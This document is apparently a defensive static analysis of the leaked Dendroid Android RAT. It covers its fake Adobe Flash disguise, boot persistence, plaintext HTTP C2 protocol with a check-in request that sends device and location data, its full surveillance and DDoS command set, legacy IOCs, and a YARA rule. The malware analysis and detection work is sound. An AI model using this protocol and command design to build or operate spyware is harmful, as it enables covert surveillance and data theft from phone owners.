# BetterAndroRAT / Dendroid — Static Analysis (Source-Level)

> Educational / defensive analysis only. This documents how the malware works so
> it can be recognized, detected, and defended against. Nothing here builds,
> configures, or deploys the tooling.

## 1. Family identification

This repo is a repackaged copy of **Dendroid**, the Android RAT whose source
leaked publicly in 2013. Evidence in-tree:

- `Payload/AndroidManifest.xml` → package `com.adobe.flash13`, labeled as
  "Adobe Flash Player" v2.0 (fake-Flash disguise).
- `Payload/src/com/connect/MyService.java` line ~82 hardcodes a base64-encoded
  C2 URL. The shipped default decodes to `http://josequervo.net/master` with
  password `a2V5bGltZXBpZQ==` = `keylimepie` — the well-known Dendroid example
  credentials.
- `Panel/Index/functions.php` hardcodes `http://pizzachip.com/rat/`, another
  known Dendroid panel host.
- Command vocabulary (`getcontacts(`, `transferbot(`, `blocksms(`, …) matches
  the published Dendroid command set.

## 2. Architecture

```
Victim phone                      Attacker infrastructure
┌────────────────────┐   HTTP GET  ┌─────────────────────────────┐
│ Payload (APK)      │ ──────────► │ Panel (PHP + MySQL)         │
│ com.adobe.flash13  │             │  get.php        – check-in  │
│  └─ MyService      │ ◄────────── │  get-functions  – commands  │
│     (C2 loop)      │  commands   │  message.php    – exfil     │
└────────────────────┘             │  login/control  – operator UI│
                                   └─────────────────────────────┘
Binder (VB.NET, Windows) — stitches the payload into a legitimate APK.
```

- **Payload**: Android app, ~3.6k lines of Java. All logic lives in
  `MyService.java` (2,491 lines) — one giant polling loop plus AsyncTask
  classes per capability (camera, audio recording, HTTP flood, file upload…).
- **Panel**: PHP + MySQL. `functions.php` defines `updateSlave()`,
  `slave_exists()`, `setFunction()` over a `bots`/`slaves` table; the rest of
  the endpoints are thin CRUD over it.
- **Binder**: VB.NET WinForms app that repackages a host APK with the payload.

## 3. Persistence & disguise (from AndroidManifest.xml)

| Technique | Mechanism |
|---|---|
| Fake identity | Package `com.adobe.flash13`, "Adobe Flash Player" label |
| No visible UI | `android:theme="@style/Invisible"`, `excludeFromRecents="true"` on all activities |
| Boot persistence | `ServiceReceiver` listens for `BOOT_COMPLETED` / `QUICKBOOT_POWERON` with `priority=1000` and restarts `MyService` |
| SMS interception | Receiver also listens for `SMS_RECEIVED` and `PHONE_STATE` |
| Anti-uninstall | `promptuninstall(` command + `DELETE` flow controlled by the panel |

Requested permissions (the threat surface in one list): `READ/WRITE/SEND/RECEIVE_SMS`,
`READ_CONTACTS`, `ACCESS_FINE_LOCATION`, `CALL_PHONE`, `PROCESS_OUTGOING_CALLS`,
`CAMERA`, `RECORD_AUDIO`, `GET_ACCOUNTS`, `READ_HISTORY_BOOKMARKS`, `GET_TASKS`,
`WRITE_EXTERNAL_STORAGE`, `INTERNET`.

## 4. C2 protocol (plain HTTP, GET-based)

All traffic is unauthenticated-against-TLS plaintext HTTP GET — trivially
signaturable.

### Check-in (`get.php`)
Client sends device fingerprint as query parameters:

```
GET /get.php?UID=<imei-ish>&Device=<model>&Version=<android ver>
             &Coordinates=<lat,long>&Provider=<carrier>
             &Phone_Number=<num>&Password=keylimepie&Sdk=<api>&Random=<nonce>
```

Server-side (`get.php` + `functions.php::updateSlave`) the only "auth" is a
plaintext password comparison (`$_GET['Password'] == "keylimepie"`).
Credentials sit in the client as **base64 strings** — obfuscation, not
encryption (`MyService.java` lines ~82–84: `encodedURL`, `encodedPassword`).

### Command polling (`get-functions.php`)
The service polls `get-functions.php` for queued commands; each command is a
function-call-shaped string terminated by `(`, e.g. `getcontacts(`. The client
parses the line and dispatches:

```
blocksms(          callnumber(        changedirectory(     deletecalllognumber(
deletefiles(       deletesms(         getbrowserbookmarks( getbrowserhistory(
getcallhistory(    getcontacts(       getinboxsms(         getinstalledapps(
getsentsms(        getuseraccounts(   httpflood(           intercept(
mediavolumedown(   mediavolumeup(     openapp(             opendialog(
openwebpage(       promptuninstall(   promptupdate(        recordaudio(
recordcalls(       ringervolumedown(  ringerup…            screenon(
sendcontacts(      sendtext(          setbackupurl(        settimeout(
takephoto(         takevideo(         transferbot(         updateapp(
uploadfiles(       uploadpictures(
```

Notable items:
- `httpflood(` — built-in DDoS capability (`httpFlood` AsyncTask, line ~2156).
- `transferbot(` / `setbackupurl(` — re-point the bot to a new C2 URL at
  runtime (infrastructure mobility).
- `recordcalls(` / `recordaudio(` — `RecordService` captures microphone and
  call audio.
- `takephoto(` / `takevideo(` — silent camera capture via `CameraView`.

### Exfiltration (`message.php`, uploads)
Results go back via `message.php` and multipart uploads (`httpmime-4.0.jar` in
`libs/`), keyed by the same UID/password.

## 5. Panel internals (for defenders)

- `functions.php`: PDO/MySQL mixed with legacy `mysql_query()` (even the
  authors mixed APIs — `setFunction()` uses `mysql_*` while `slave_exists()`
  uses PDO prepared statements).
- `login.php`/`control.php`/`index.php`: operator UI; `addcommand.php` queues
  commands into the DB that `get-functions.php` hands out.
- `blockbot.php`, `deletebot.php`, `deletefile.php`…: bot management.
- Setup wizard (`setup/`) writes `config.php` with DB credentials — this is the
  "create the project" step I won't perform; for detection purposes, its output
  is just `config.php` consumed by `functions.php`.

## 6. Detection guidance

**Network signatures**
- GET requests to `*/get.php?UID=…&Password=…&Sdk=…` with all those params at
  once is highly specific to Dendroid.
- Periodic low-frequency GETs to `get-functions.php` followed by uploads to
  `message.php`.
- Base64-decoding strings inside a sample and finding an `http://` URL plus a
  short ASCII password (the `encodedURL`/`encodedPassword` pattern).

**Host/AV signatures (static)**
- Package masquerading as `com.adobe.flash*` with an invisible theme and a
  `BOOT_COMPLETED` receiver in `com.connect.*`.
- Classes `MyService`, `ServiceReceiver`, `RecordService` in package
  `com.connect` inside a non-Adobe-signed APK.
- Permission combo: SMS read/write/send + contacts + fine location +
  outgoing-call processing + camera + audio in one app with no UI.

**YARA sketch (APK/dex)**

```yara
rule Dendroid_Payload_Strings {
    strings:
        $a = "com/connect/MyService"
        $b = "get-functions.php"
        $c = "transferbot("
        $d = "blocksms("
        $e = "encodedPassword"
    condition:
        ($a and $b) or ($c and $d) or ($a and $e)
}
```

## 7. Historical notes / IOCs present in this tree

- `josequervo.net/master` (default encoded C2 in source comments)
- `pizzachip.com/rat/` (default panel URL in `functions.php`)
- Password `keylimepie`
These are from the original leaked source; they should be treated as legacy
IOCs, not live infrastructure.

## 8. Why "build it then reverse it" is unnecessary

The entire behavior surface of the malware is readable above from source alone:
protocol format, command vocabulary, persistence, disguise, and exfil paths.
Compiling the payload or generating the panel config would add nothing to the
analysis and would produce functional attack tooling, which is out of scope.
